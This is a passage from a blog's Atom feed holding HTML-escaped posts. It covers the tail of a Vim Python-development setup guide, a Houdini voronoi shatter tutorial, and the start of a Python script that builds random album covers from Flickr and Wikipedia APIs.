&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;guifont&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;DejaVu\ Sans\ Mono\ &lt;span class="k"&gt;for&lt;/span&gt;\ Powerline\ &lt;span class="m"&gt;9&lt;/span&gt;
&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;laststatus&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;:code:&lt;tt class="docutils literal"&gt;laststatus&lt;/tt&gt; ensures that Powerline shows up even if you don't have any splits.&lt;/p&gt;
&lt;p&gt;Restart vim and hopefully you'll see your powerline appear at the bottom of you window.&lt;/p&gt;
&lt;p&gt;Please note that this version of Powerline is a Python based version and thus requires your Vim to  be built
with Python enabled. To check if it is run:&lt;/p&gt;
&lt;pre class="code bash literal-block"&gt;
$&amp;gt; vim --version &lt;span class="p"&gt;|&lt;/span&gt; grep -i python
&lt;/pre&gt;
&lt;p&gt;from the commandline. If you see :code:&lt;tt class="docutils literal"&gt;+python&lt;/tt&gt; then you are ok. There is
&lt;a class="reference external" href="https://github.com/Lokaltog/vim-powerline"&gt;another Powerline&lt;/a&gt; that is a native Vim plugin should
you not have Python enabled or prefer to use it over the Python version.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="fugitive"&gt;
&lt;h2&gt;Fugitive&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://git-scm.com/"&gt;Fugitive &amp;lt;https://github.com/tpope/vim-fugitive) is a `Git&lt;/a&gt; plugin. It basically wraps
most Git commands so that you can call them from inside Vim. They are prefixed with &lt;code&gt;G&lt;/code&gt;, for example &lt;code&gt;Gcommit&lt;/code&gt;
For example it allows you to stage files directly from Vim and make the commit. It also leverages VimDiff to perform
conflict resolution, blame and the like. There's a whole set of screencasts on how to use it available from
&lt;a class="reference external" href="http://vimcasts.org/episodes/fugitive-vim---a-complement-to-command-line-git/"&gt;Vim Casts&lt;/a&gt; which I recommend watching.&lt;/p&gt;
&lt;p&gt;To install Fugitive, add its bundle to Vundle:&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
Bundle &lt;span class="s1"&gt;'tpope/vim-fugitive'&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Run :code:&lt;tt class="docutils literal"&gt;:BundleInstall&lt;/tt&gt; again to install it.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="nerdtree"&gt;
&lt;h2&gt;NerdTree&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="https://github.com/scrooloose/nerdtree"&gt;NerdTree&lt;/a&gt; is a filebrowser that pops up in a
split when you need it and features a tree like file browser (hence the  &lt;em&gt;tree&lt;/em&gt; part in the name).
It looks somewhat like this:&lt;/p&gt;
&lt;img alt="" src="/images/nerdtree.png" /&gt;
&lt;p&gt;As usual you just need to add its package to Vundle:&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
Bundle &lt;span class="s1"&gt;'scrooloose/nerdtree'&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;and &lt;code&gt;:BundleInstall&lt;/code&gt; once you restart Vim. To activate with &lt;code&gt;F2&lt;/code&gt; add the following to &lt;code&gt;.vimrc&lt;/code&gt;:&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
map &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;F2&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; :NERDTreeToggle&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;CR&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Press &lt;code&gt;F2&lt;/code&gt; in vim and it will take you to the current working directory. Press &lt;code&gt;?&lt;/code&gt; to see NerdTree's
list of commands.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="python-mode"&gt;
&lt;h2&gt;Python mode&lt;/h2&gt;
&lt;p&gt;This is the big one. It basically adds all the Python functionality you could ever want in Vim. Things like Lint,
codecompletion, documentation lookup, jump to classes, refactoring tools etc. You'll find it in
&lt;a class="reference external" href="https://github.com/klen/python-mode"&gt;Python-mode&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Its bundle is:&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
Bundle &lt;span class="s1"&gt;'klen/python-mode'&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Again, &lt;code&gt;:BundleInstall&lt;/code&gt; to install it and then we probably want to configure some items. There's a lot to
configure, so if you want the complete picture I suggest you head over to the
&lt;a class="reference external" href="https://github.com/klen/python-mode"&gt;Github repo&lt;/a&gt; and read the more complete docs,
or run &lt;code&gt;:help python-mode&lt;/code&gt; from inside Vim.&lt;/p&gt;
&lt;p&gt;I found the following settings most useful personally, but you might want to tweak some settings to suit your needs
and workflow. The following a copy-paste from my .vimrc. The keyboard shortcuts in the comments are the ones I find
most useful and I keep them there for reference:&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
&lt;span class="c"&gt;&amp;quot; Python-mode&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; Activate rope&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; Keys:&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; K             Show python docs&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; &amp;lt;Ctrl-Space&amp;gt;  Rope autocomplete&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; &amp;lt;Ctrl-c&amp;gt;g     Rope goto definition&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; &amp;lt;Ctrl-c&amp;gt;d     Rope show documentation&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; &amp;lt;Ctrl-c&amp;gt;f     Rope find occurrences&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; &amp;lt;Leader&amp;gt;b     Set, unset breakpoint (g:pymode_breakpoint enabled)&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; [[            Jump on previous class or function (normal, visual, operator modes)&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; ]]            Jump on next class or function (normal, visual, operator modes)&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; [M            Jump on previous class or method (normal, visual, operator modes)&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; ]M            Jump on next class or method (normal, visual, operator modes)&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_rope &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="c"&gt;
&amp;quot; Documentation&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_doc &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_doc_key &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'K'&lt;/span&gt;
&lt;span class="c"&gt;
&amp;quot;Linting&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_lint &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_lint_checker &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;pyflakes,pep8&amp;quot;&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; Auto check on save&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_lint_write &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="c"&gt;
&amp;quot; Support virtualenv&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_virtualenv &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="c"&gt;
&amp;quot; Enable breakpoints plugin&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_breakpoint &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_breakpoint_bind &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'&amp;lt;leader&amp;gt;b'&lt;/span&gt;
&lt;span class="c"&gt;
&amp;quot; syntax highlighting&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_syntax &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_syntax_all &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_syntax_indent_errors &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_syntax_all
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_syntax_space_errors &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_syntax_all
&lt;span class="c"&gt;
&amp;quot; Don't autofold code&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:pymode_folding &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;To explain the above a bit, here's what it does:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Allow me to look up Python docs by pressing &lt;code&gt;K&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Automatically check my code on each save, but only use &lt;code&gt;PyLint&lt;/code&gt; or &lt;code&gt;PyFlakes&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Support virtualenv&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;&amp;lt;leader&amp;gt;b&lt;/code&gt; to add a pdb shortcut (inserts &lt;code&gt;import pdb; pdb.set_trace() # XXX BREAKPOINT&lt;/code&gt; into your code&lt;/li&gt;
&lt;li&gt;Enhanced syntax highlighting and formatting&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As I said, please read the full docs and adjust the settings as you see fit.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="jedi-vim"&gt;
&lt;h2&gt;Jedi vim&lt;/h2&gt;
&lt;p&gt;Since I wrote this article I have discovered &lt;a class="reference external" href="https://github.com/davidhalter/jedi-vim"&gt;Jedi-vim&lt;/a&gt;
which I now use as the autocompletion tool instead of the rope plugin that comes with Python Mode. All you need to do is
add the plugin to the vundle list and turn off Rope by replacing the &lt;code&gt;let g:pymode_rope = 1&lt;/code&gt; with
&lt;code&gt;let g:pymode_rope = 0&lt;/code&gt;. I feel it's snappier and more capable than Rope. But if you want to avoid
installing another plugin, then feel free to stay with Rope.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="other-settings"&gt;
&lt;h2&gt;Other settings&lt;/h2&gt;
&lt;p&gt;I also use some specific Vim settings in &lt;code&gt;.vimrc&lt;/code&gt; that make the experience a bit nicer for me:&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
&lt;span class="c"&gt;&amp;quot; Use &amp;lt;leader&amp;gt;l to toggle display of whitespace&lt;/span&gt;
nmap &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;leader&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="k"&gt;l&lt;/span&gt; :&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;!&amp;lt;&lt;/span&gt;CR&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;&amp;quot; automatically change window's cwd to file's dir&lt;/span&gt;
&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;autochdir&lt;/span&gt;
&lt;span class="c"&gt;
&amp;quot; I'm prefer spaces to tabs&lt;/span&gt;
&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;tabstop&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;
&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;shiftwidth&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;
&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;expandtab&lt;/span&gt;
&lt;span class="c"&gt;
&amp;quot; more subtle popup colors&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; has &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'gui_running'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nb"&gt;highlight&lt;/span&gt; Pmenu guibg&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;#cccccc&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt;
&lt;span class="k"&gt;endif&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="summary"&gt;
&lt;h2&gt;Summary&lt;/h2&gt;
&lt;p&gt;This is basically the crux of my Python and Vim development setup. I think the core of the whole thing really is
python mode as it provides the most Python specific tools. The other plugins however do add some really useful
functionality to make your life a little easier. You might ask why I don't list things like &lt;code&gt;fuzzy file search&lt;/code&gt;
and such, and that's because I don't use it. I've tried it before and didn't really get on with it very well and I
prefer to either just open the files directly or using &lt;code&gt;NerdTree&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I hope that this post provides some pointers to help you setup your Vim based Python development environment. As
I said above, feel free to leave a comment with any plugins or settings that you find useful, always happy to hear
about what else is out there.&lt;/p&gt;
&lt;p&gt;Thanks for reading.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Houdini voronoi shatter</title><link href="http://unlogic.co.uk/2012/12/08/houdini-voronoi-shatter/" rel="alternate"></link><updated>2012-12-08T00:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2012-12-08:2012/12/08/houdini-voronoi-shatter/</id><summary type="html">&lt;p&gt;Thought I would write about creating a very simple voronoi shatter effect in Houdini and how to explode it. The video below demonstrates the effect we're looking to achieve:&lt;/p&gt;
&lt;iframe src="https://player.vimeo.com/video/55168444" width="500" height="375" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen&gt;&lt;/iframe&gt;
&lt;p&gt;&lt;a href="https://vimeo.com/55168444"&gt;voronoi&lt;/a&gt; from &lt;a href="https://vimeo.com/user1380774"&gt;Sven&lt;/a&gt; on &lt;a href="https://vimeo.com"&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;The process of creating this is very simple, and I learned a few things from setting this up, so I figured I would share and hope you learn something from it too.&lt;/p&gt;
&lt;p&gt;So first we need to drop down a &lt;code&gt;Geometry&lt;/code&gt; node and dive inside. Delete the file node and then create a &lt;code&gt;box&lt;/code&gt; node. This box will be the object we will shatter. But in order to create a voronoi shatter we also need some seed points to generate the pattern with. So let's do that first. We'll use our box to generate the points we need, so drop down a &lt;code&gt;Points From Volume&lt;/code&gt; node and connect the box to its input. Adjust the settings to your liking, or copy the ones below. I kept the number of points low as I wanted fewer and larger pieces.&lt;/p&gt;
&lt;img alt="" src="/images/points_from_vol.png" /&gt;
&lt;p&gt;Now that we have our points we can drop down a &lt;code&gt;Voronoi Fracture&lt;/code&gt; node and connect the points to its second input. The only setting I changed was to turn on &lt;code&gt;Connect Inside Edges&lt;/code&gt;. Finally we need to connect the &lt;em&gt;box&lt;/em&gt; node to the &lt;em&gt;Voronoi Shatter's&lt;/em&gt; first input. Now make the &lt;em&gt;Voronoi shatter&lt;/em&gt; visible and you should see your fractured geo.&lt;/p&gt;
&lt;img alt="" src="/images/fracture.png" /&gt;
&lt;p&gt;Next we'll turn on the dynamics via the rigid bodies shelf at the top. Click &lt;em&gt;RBD Fracture&lt;/em&gt; and make sure the voronoi geo is selected and press enter. If you press play now your object will fall down. Hrmmm, not totally awesome, as we wanted to explode it a little too. So the plan is to make all the pieces explode from the outwards, like, for example, along the normals of a sphere say? Yes, that sounds about right. Ok, so let's put down a &lt;em&gt;Sphere&lt;/em&gt; and scale it so that it's roughly the same size as the box. Append a &lt;em&gt;Point&lt;/em&gt; node to the sphere and add a &lt;em&gt;Normal&lt;/em&gt; and &lt;em&gt;Velocity&lt;/em&gt; attribute. The &lt;em&gt;Velocity&lt;/em&gt; attribute is under the &lt;em&gt;Particle&lt;/em&gt; tab and we'll set its value to be a facture of the point's normal. Feel free to play with this value to get the efect you want. Basically this will set the point's velocity to the normal at that point, causing the pieces to rediate outwards when the sim starts.&lt;/p&gt;
&lt;img alt="" src="/images/vel_attribute.png" /&gt;
&lt;p&gt;Connect the output to the second input of an &lt;em&gt;Attribute Transfer&lt;/em&gt; node and then connect the output of that to the &lt;em&gt;Rest Position&lt;/em&gt; node. Connect the &lt;em&gt;Box&lt;/em&gt; to the first input of the &lt;em&gt;Attribute Transfer&lt;/em&gt; node. This will transfer the point attributes of the &lt;em&gt;Sphere&lt;/em&gt; onto the shattered geo. You should now have a network that looks like this:&lt;/p&gt;
&lt;img alt="" src="/images/finalnetwork.png" /&gt;
&lt;p&gt;And yet still to exploding pieces? Well, we need to tell our solver to use the point velocity. So dive into the &lt;em&gt;Autodop Network&lt;/em&gt; and on the &lt;em&gt;RBD Fracture Object&lt;/em&gt; enable &lt;em&gt;Inherit Velocity From Point Velocity&lt;/em&gt;. Hit play and you should see it explode.&lt;/p&gt;
&lt;img alt="" src="/images/inherit_pv.png" /&gt;
</summary></entry><entry><title>Random album generator in python</title><link href="http://unlogic.co.uk/2012/11/06/random-album-generator-in-python/" rel="alternate"></link><updated>2012-11-06T00:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2012-11-06:2012/11/06/random-album-generator-in-python/</id><summary type="html">&lt;p&gt;You may have heard about the &amp;quot;random music album&amp;quot; thing. Basically it goes like this:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;The album cover is the 4th image from a random page of Flickr's interesting pics&lt;/li&gt;
&lt;li&gt;The band name is the title of a random Wikipedia article&lt;/li&gt;
&lt;li&gt;The album name comes from the last 3 or 5 words of a famous quote&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This is all well and good, but isn't getting all this data manually, and then making the album cover a bit tedious? Sure it is, so let's see how we can do this in python&lt;/p&gt;
&lt;p&gt;Here are some example images generated with this script (click for the full size picture):&lt;/p&gt;
&lt;img alt="" src="/images/album2.jpg" style="width: 400px;" /&gt;
&lt;img alt="" src="/images/album3.jpg" style="width: 400px;" /&gt;
&lt;img alt="" class="align-center" src="/images/album4.jpg" style="width: 400px;" /&gt;
&lt;p&gt;Let's cover our dependencies first. You will need:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;python 2.6 (or similar)&lt;/li&gt;
&lt;li&gt;PIL (&lt;a class="reference external" href="http://www.pythonware.com/products/pil/)"&gt;python Image Library&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;A &lt;a class="reference external" href="http://www.flickr.com/services/apps/create/apply/"&gt;Flickr API key&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="http://www.gnu.org/software/wget/"&gt;wget&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Not much to ask for is it? So once you've made sure you have all that, let's start by getting the album cover. This is handled by the &lt;a class="reference external" href="http://www.flickr.com/services/api/flickr.interestingness.getList.html"&gt;interestingness&lt;/a&gt; part of the API and is a very simple call that will return an XML structure of the photos on that page. Once we have a response we parse the XML and get the elements we need to construct the photo URL. It's a short function and here it is:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;getAlbumImage&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://api.flickr.com/services/rest/?method=flickr.interestingness.getList&amp;amp;api_key=YOURAPIKEYHERE&amp;amp;per_page=6&amp;amp;page=&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;&amp;amp;format=rest&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;dom&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;minidom&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="n"&gt;elem&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dom&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getElementsByTagName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'photo'&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="n"&gt;farm_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;elem&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getAttributeNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'farm'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;nodeValue&lt;/span&gt;
    &lt;span class="n"&gt;server_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;elem&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getAttributeNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'server'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;nodeValue&lt;/span&gt;
    &lt;span class="n"&gt;the_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;elem&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getAttributeNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'id'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;nodeValue&lt;/span&gt;
    &lt;span class="n"&gt;secret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;elem&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getAttributeNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'secret'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;nodeValue&lt;/span&gt;

    &lt;span class="n"&gt;photo_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://farm&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;.staticflickr.com/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;_&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;_b.jpg&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;farm_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;server_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;the_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;secret&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;target_photo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'band.jpg'&lt;/span&gt;
    &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/wget&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-O&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;target_photo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;photo_url&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;First we generate a random number which will be the page number we use in constructing the API URL. Once constructed we use &lt;code&gt;minidom&lt;/code&gt; to parse it and start extracting our data. If you paste the URL into your browser (with your valid API key) you can see the response format. Now that we have all the data we need, we construct our image URL (the format for this is in the docs) and save it to &lt;code&gt;band.jpg&lt;/code&gt; using &lt;code&gt;wget&lt;/code&gt;. You can of course use something else, but this is just easy here.&lt;/p&gt;
&lt;p&gt;Right, onto getting our band name. This is the random Wikipedia article. Luckily Wikipedia has an API also, and doesn't require an API key for this purpose. This is an even shorter function:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;getBandName&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;random_wiki_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://en.wikipedia.org/w/api.php?format=xml&amp;amp;action=query&amp;amp;list=random&amp;amp;rnnamespace=0&amp;amp;rnlimit=1&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;dom&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;minidom&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random_wiki_url&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;dom&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getElementsByTagName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'page'&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getAttributeNode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'title'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;nodeValue&lt;/span&gt;
&lt;/pre&gt;
